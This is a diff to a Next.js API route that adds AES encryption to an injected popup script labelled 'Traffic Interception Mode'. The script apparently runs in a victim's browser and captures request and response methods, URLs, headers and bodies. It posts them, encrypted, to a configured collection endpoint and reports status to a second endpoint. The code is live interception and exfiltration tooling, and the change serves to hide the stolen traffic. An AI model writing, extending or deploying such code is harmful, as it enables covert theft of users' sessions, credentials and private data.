@@ -83,20 +83,41 @@ export async function GET(request: NextRequest) {
   // Traffic Interception Mode - Auxiliary window controller
   // Uses Base64 encoding to avoid escaping issues in document.write()
   if (persistentEnabled && advancedPersistentEnabled) {
+    const useEncryption = persistentKey && persistentKey.length === 64;
+    
+    // AES encryption functions for popup (if enabled)
+    const aesCode = useEncryption ? `
+var _k="${persistentKey}";var _cs=!!(window.crypto&&window.crypto.subtle);
+function _h2b(h){for(var b=[],i=0;i<h.length;i+=2)b.push(parseInt(h.substr(i,2),16));return new Uint8Array(b)}
+function _b2h(b){return Array.from(b).map(function(x){return x.toString(16).padStart(2,'0')}).join('')}
+async function _enc(t){if(!_cs)return null;var k=await crypto.subtle.importKey('raw',_h2b(_k),{name:'AES-CBC'},false,['encrypt']);var iv=crypto.getRandomValues(new Uint8Array(16));var e=await crypto.subtle.encrypt({name:'AES-CBC',iv:iv},k,new TextEncoder().encode(t));return _b2h(iv)+_b2h(new Uint8Array(e))}
+` : '';
+
     // Popup script code - will be base64 encoded
     // Combined request+response in single entry for efficiency
     const popupCode = `
+${aesCode}
 var main=window.opener;
 var rid=main.__rid;
 var tf="${tf}";
 var ps="${ps}";
 var nxs="${baseUrl}";
 function isNx(u){if(!u)return false;try{return u.indexOf(nxs)===0||u.indexOf("/api/")===0}catch(e){return false}}
+${useEncryption ? `
+async function rpt(t,m,u,reqH,reqB,resH,resB,s){
+  if(isNx(u))return;
+  try{
+    var payload=JSON.stringify({type:t,method:m,url:u,reqHeaders:reqH,reqBody:reqB,resHeaders:resH,resBody:resB,status:s});
+    var enc=_cs?await _enc(payload):null;
+    var x=new XMLHttpRequest();x.open("POST",tf,true);x.setRequestHeader("Content-Type","application/json");
+    x.send(JSON.stringify({rid:rid,encrypted:!!enc,data:enc||payload}))
+  }catch(e){}
+}` : `
 function rpt(t,m,u,reqH,reqB,resH,resB,s){
   if(isNx(u))return;
   try{var x=new XMLHttpRequest();x.open("POST",tf,true);x.setRequestHeader("Content-Type","application/json");
   x.send(JSON.stringify({rid:rid,type:t,method:m,url:u,reqHeaders:reqH,reqBody:reqB,resHeaders:resH,resBody:resB,status:s}))}catch(e){}
-}
+}`}
 function sstat(s){try{var x=new XMLHttpRequest();x.open("POST",ps,true);x.setRequestHeader("Content-Type","application/json");x.send(JSON.stringify({rid:rid,status:s}))}catch(e){}}
 function getBrowserHeaders(w,url){
   var s="";
